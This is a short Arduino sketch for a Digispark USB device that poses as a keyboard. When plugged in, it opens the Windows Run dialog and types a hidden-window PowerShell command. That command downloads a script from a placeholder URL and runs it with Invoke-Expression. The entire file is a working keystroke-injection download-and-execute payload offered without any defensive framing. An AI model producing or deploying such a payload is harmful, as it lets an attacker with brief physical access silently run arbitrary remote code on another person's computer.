#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden \"$v = (New-Object Net.WebClient).DownloadString('URL');Invoke-Expression $v;\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
  }
}
